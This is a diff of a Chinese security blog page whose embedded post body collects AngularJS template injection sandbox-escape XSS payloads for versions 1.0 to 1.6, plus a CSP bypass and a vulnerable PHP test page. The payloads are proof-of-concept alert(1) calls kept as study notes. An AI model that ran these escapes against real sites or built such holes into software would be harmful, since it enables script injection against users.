@@ -11,11 +11,11 @@
     
     
     
-    <script type="application/ld+json">{"@context":"http://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"John Doe","sameAs":[]},"articleBody":"js没好好学，先记下payload，留着以后用\n\n\n12345678910111213&lt;html ng-app&gt;&lt;head&gt;    &lt;script src=&quot;https://code.angularjs.org/&#123;version&#125;/angular.min.js&quot;&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;    &lt;p&gt;    &lt;?php        $q = $_GET[&apos;q&apos;];        echo htmlspecialchars($q,ENT_QUOTES);    ?&gt;&lt;/p&gt;   &lt;/body&gt;&lt;/html&gt;\n\npaylaodv1.0.1-v1.1.51?q=&#123;&#123; constructor.constructor(&apos;alert(1)&apos;)() &#125;&#125;\n\nv1.2.0-v1.2.181?q=&#123;&#123; a=&apos;constructor&apos;;b=&#123;&#125;;a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,&apos;alert(1)&apos;)() &#125;&#125;\n\nv1.2.19-v1.2.231?q=&#123;&#123; toString.constructor.prototype.toString=toString.constructor.prototype.call;[&quot;a&quot;,&quot;alert(1)&quot;].sort(toString.constructor)  &#125;&#125;\n\nv1.2.24-v1.2.26\nv1.2.27-v1.2.29/v1.3.0-v1.3.201?q=&#123;&#123; &#123;&#125;.&quot;)));alert(1)//&quot;; &#125;&#125;\n\n实际测试为v1.2.20-v1.2.32/v1.3.0-v1.3.20均生效。\nv1.4.0-v1.4.5（仅chrome）1?q=&#123;&#123; o=&#123;&#125;;l=o[[&apos;__lookupGetter__&apos;]];(l=l)(&apos;event&apos;)().target.defaultView.location=&apos;javascript:alert(1)&apos;; &#125;&#125;\n\nv1.4.5-1.5.8 （仅chrome）1?q=&#123;&#123; x=&#123;y:&apos;&apos;.constructor.prototype&#125;;x.y.charAt=[].join;[1]|orderBy:&apos;x=alert(1)&apos; &#125;&#125;\n\nv1.6.0-1.6.61?q=&#123;&#123; [].pop.constructor(&apos;alert(1)&apos;)() &#125;&#125;\n\ncsp bypass （仅chrome v1.4.0-v1.6.6）123456789101112131415&lt;html ng-app&gt;&lt;head&gt;    &lt;?php        header(&quot;Content-Security-Policy:default-src &apos;self&apos;;script-src code.angularjs.org &apos;self&apos;&quot;);    ?&gt;    &lt;script src=&quot;https://code.angularjs.org/&#123;version&#125;/angular.min.js&quot;&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;    &lt;p&gt;    &lt;?php        echo $_GET[&apos;q&apos;];    ?&gt;&lt;/p&gt;   &lt;/body&gt;&lt;/html&gt;\n\n1?q=&lt;input+autofocus ng-focus=&quot;$event.path|orderBy:&apos;!x?[].constructor.from([x=1],alert):0&apos;&quot;&gt;\n\n","dateCreated":"2019-10-29T19:21:24+08:00","dateModified":"2020-02-26T14:40:01+08:00","datePublished":"2019-10-29T19:21:24+08:00","description":"js没好好学，先记下payload，留着以后用","headline":"Angularjs模板注入","image":[],"mainEntityOfPage":{"@type":"WebPage","@id":"http://yoursite.com/2019/10/29/Angularjs模板注入/"},"publisher":{"@type":"Organization","name":"John Doe","sameAs":[]},"url":"http://yoursite.com/2019/10/29/Angularjs模板注入/"}</script>
+    <script type="application/ld+json">{"@context":"http://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"John Doe","sameAs":[]},"articleBody":"js没好好学，先记下payload，留着以后用\n\n\n12345678910111213&lt;html ng-app&gt;&lt;head&gt;    &lt;script src=&quot;https://code.angularjs.org/&#123;version&#125;/angular.min.js&quot;&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;    &lt;p&gt;    &lt;?php        $q = $_GET[&apos;q&apos;];        echo htmlspecialchars($q,ENT_QUOTES);    ?&gt;&lt;/p&gt;   &lt;/body&gt;&lt;/html&gt;\n\npaylaodv1.0.1-v1.1.51?q=&#123;&#123; constructor.constructor(&apos;alert(1)&apos;)() &#125;&#125;\n\nv1.2.0-v1.2.181?q=&#123;&#123; a=&apos;constructor&apos;;b=&#123;&#125;;a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,&apos;alert(1)&apos;)() &#125;&#125;\n\nv1.2.19-v1.2.231?q=&#123;&#123; toString.constructor.prototype.toString=toString.constructor.prototype.call;[&quot;a&quot;,&quot;alert(1)&quot;].sort(toString.constructor)  &#125;&#125;\n\nv1.2.24-v1.2.26\nv1.2.27-v1.2.29/v1.3.0-v1.3.201?q=&#123;&#123; &#123;&#125;.&quot;)));alert(1)//&quot;; &#125;&#125;\n\n实际测试为v1.2.20-v1.2.32/v1.3.0-v1.3.20均生效。\nv1.4.0-v1.4.5（仅chrome）1?q=&#123;&#123; o=&#123;&#125;;l=o[[&apos;__lookupGetter__&apos;]];(l=l)(&apos;event&apos;)().target.defaultView.location=&apos;javascript:alert(1)&apos;; &#125;&#125;\n\nv1.4.5-1.5.8 （仅chrome）1?q=&#123;&#123; x=&#123;y:&apos;&apos;.constructor.prototype&#125;;x.y.charAt=[].join;[1]|orderBy:&apos;x=alert(1)&apos; &#125;&#125;\n\nv1.6.0-1.6.61?q=&#123;&#123; [].pop.constructor(&apos;alert(1)&apos;)() &#125;&#125;\n\ncsp bypass （仅chrome v1.4.0-v1.6.6）123456789101112131415&lt;html ng-app&gt;&lt;head&gt;    &lt;?php        header(&quot;Content-Security-Policy:default-src &apos;self&apos;;script-src code.angularjs.org &apos;self&apos;&quot;);    ?&gt;    &lt;script src=&quot;https://code.angularjs.org/&#123;version&#125;/angular.min.js&quot;&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;    &lt;p&gt;    &lt;?php        echo $_GET[&apos;q&apos;];    ?&gt;&lt;/p&gt;   &lt;/body&gt;&lt;/html&gt;\n\n1?q=&lt;input+autofocus ng-focus=&quot;$event.path|orderBy:&apos;!x?[].constructor.from([x=1],alert):0&apos;&quot;&gt;\n\n","dateCreated":"2019-10-29T19:21:24+08:00","dateModified":"2020-02-26T14:40:01+08:00","datePublished":"2019-10-29T19:21:24+08:00","description":"js没好好学，先记下payload，留着以后用","headline":"Angularjs模板注入","image":[],"mainEntityOfPage":{"@type":"WebPage","@id":"http://p1keman.github.io/2019/10/29/Angularjs模板注入/"},"publisher":{"@type":"Organization","name":"John Doe","sameAs":[]},"url":"http://p1keman.github.io/2019/10/29/Angularjs模板注入/"}</script>
     <meta name="description" content="js没好好学，先记下payload，留着以后用">
 <meta property="og:type" content="blog">
 <meta property="og:title" content="Angularjs模板注入">
-<meta property="og:url" content="http://yoursite.com/2019/10/29/Angularjs模板注入/index.html">
+<meta property="og:url" content="http://p1keman.github.io/2019/10/29/Angularjs模板注入/index.html">
 <meta property="og:site_name" content="Hexo">
 <meta property="og:description" content="js没好好学，先记下payload，留着以后用">
 <meta property="og:locale" content="zh-cn">
@@ -277,7 +277,7 @@
             <a
                 class="post-action-btn btn btn--default btn-open-shareoptions"
                 href="#btn-open-shareoptions"
-                aria-label="Diesen Beitrag teilen"
+                aria-label="Share this post"
             >
                 <i class="fa fa-share-alt" aria-hidden="true"></i>
             </a>
@@ -288,7 +288,7 @@
             <li class="post-action hide-xs">
                 <a
                     class="post-action-btn btn btn--default"
-                    target="new" href="https://www.facebook.com/sharer/sharer.php?u=http://yoursite.com/2019/10/29/Angularjs模板注入/"
+                    target="new" href="https://www.facebook.com/sharer/sharer.php?u=http://p1keman.github.io/2019/10/29/Angularjs模板注入/"
                     title="分享到 Facebook"
                     aria-label="分享到 Facebook"
                 >
@@ -301,7 +301,7 @@
             <li class="post-action hide-xs">
                 <a
                     class="post-action-btn btn btn--default"
-                    target="new" href="https://twitter.com/intent/tweet?text=http://yoursite.com/2019/10/29/Angularjs模板注入/"
+                    target="new" href="https://twitter.com/intent/tweet?text=http://p1keman.github.io/2019/10/29/Angularjs模板注入/"
                     title="分享到 Twitter"
                     aria-label="分享到 Twitter"
                 >
@@ -314,7 +314,7 @@
             <li class="post-action hide-xs">
                 <a
                     class="post-action-btn btn btn--default"
-                    target="new" href="https://plus.google.com/share?url=http://yoursite.com/2019/10/29/Angularjs模板注入/"
+                    target="new" href="https://plus.google.com/share?url=http://p1keman.github.io/2019/10/29/Angularjs模板注入/"
                     title="分享到 Google+"
                     aria-label="分享到 Google+"
                 >
@@ -327,7 +327,7 @@
         
         <li class="post-action">
             
-                <a class="post-action-btn btn btn--default" href="#" aria-label="Nach oben">
+                <a class="post-action-btn btn btn--default" href="#" aria-label="Back to top">
             
                 <i class="fa fa-list" aria-hidden="true"></i>
             </a>
@@ -392,7 +392,7 @@
             <a
                 class="post-action-btn btn btn--default btn-open-shareoptions"
                 href="#btn-open-shareoptions"
-                aria-label="Diesen Beitrag teilen"
+                aria-label="Share this post"
             >
                 <i class="fa fa-share-alt" aria-hidden="true"></i>
             </a>
@@ -403,7 +403,7 @@
             <li class="post-action hide-xs">
                 <a
                     class="post-action-btn btn btn--default"
-                    target="new" href="https://www.facebook.com/sharer/sharer.php?u=http://yoursite.com/2019/10/29/Angularjs模板注入/"
+                    target="new" href="https://www.facebook.com/sharer/sharer.php?u=http://p1keman.github.io/2019/10/29/Angularjs模板注入/"
                     title="分享到 Facebook"
                     aria-label="分享到 Facebook"
                 >
@@ -416,7 +416,7 @@
             <li class="post-action hide-xs">
                 <a
                     class="post-action-btn btn btn--default"
-                    target="new" href="https://twitter.com/intent/tweet?text=http://yoursite.com/2019/10/29/Angularjs模板注入/"
+                    target="new" href="https://twitter.com/intent/tweet?text=http://p1keman.github.io/2019/10/29/Angularjs模板注入/"
                     title="分享到 Twitter"
                     aria-label="分享到 Twitter"
                 >
@@ -429,7 +429,7 @@
             <li class="post-action hide-xs">
                 <a
                     class="post-action-btn btn btn--default"
-                    target="new" href="https://plus.google.com/share?url=http://yoursite.com/2019/10/29/Angularjs模板注入/"
+                    target="new" href="https://plus.google.com/share?url=http://p1keman.github.io/2019/10/29/Angularjs模板注入/"
                     title="分享到 Google+"
                     aria-label="分享到 Google+"
                 >
@@ -442,7 +442,7 @@
         
         <li class="post-action">
             
-                <a class="post-action-btn btn btn--default" href="#" aria-label="Nach oben">
+                <a class="post-action-btn btn btn--default" href="#" aria-label="Back to top">
             
                 <i class="fa fa-list" aria-hidden="true"></i>
             </a>
@@ -463,7 +463,7 @@
                     <a
                         class="share-option-btn"
                         target="new"
-                        href="https://www.facebook.com/sharer/sharer.php?u=http://yoursite.com/2019/10/29/Angularjs模板注入/"
+                        href="https://www.facebook.com/sharer/sharer.php?u=http://p1keman.github.io/2019/10/29/Angularjs模板注入/"
                         aria-label="分享到 Facebook"
                     >
                         <i class="fab fa-facebook" aria-hidden="true"></i><span>分享到 Facebook</span>
@@ -476,7 +476,7 @@
                     <a
                         class="share-option-btn"
                         target="new"
-                        href="https://twitter.com/intent/tweet?text=http://yoursite.com/2019/10/29/Angularjs模板注入/"
+                        href="https://twitter.com/intent/tweet?text=http://p1keman.github.io/2019/10/29/Angularjs模板注入/"
                         aria-label="分享到 Twitter"
                     >
                         <i class="fab fa-twitter" aria-hidden="true"></i><span>分享到 Twitter</span>
@@ -489,7 +489,7 @@
                     <a
                         class="share-option-btn"
                         target="new"
-                        href="https://plus.google.com/share?url=http://yoursite.com/2019/10/29/Angularjs模板注入/"
+                        href="https://plus.google.com/share?url=http://p1keman.github.io/2019/10/29/Angularjs模板注入/"
                         aria-label="分享到 Google+"
                     >
                         <i class="fab fa-google-plus" aria-hidden="true"></i><span>分享到 Google+</span>
